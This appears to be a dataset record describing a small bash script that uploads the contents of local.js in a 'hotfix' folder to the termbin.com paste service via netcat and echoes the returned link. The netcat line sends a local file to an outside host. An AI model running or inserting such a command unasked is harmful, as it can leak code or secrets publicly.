summary: The script changes the directory to 'hotfix', retrieves a value from 'local.js' using an external service, and assigns it to the 'superlink' variable before echoing it in the background.

details.comment: The script changes the directory to 'hotfix', retrieves a value from 'local.js' using an external service, and assigns it to the 'superlink' variable before echoing it in the background.
details.content:
#!/bin/bash
cd hotfix
superlink="$(cat local.js | nc termbin.com 9999)"
echo $superlink &
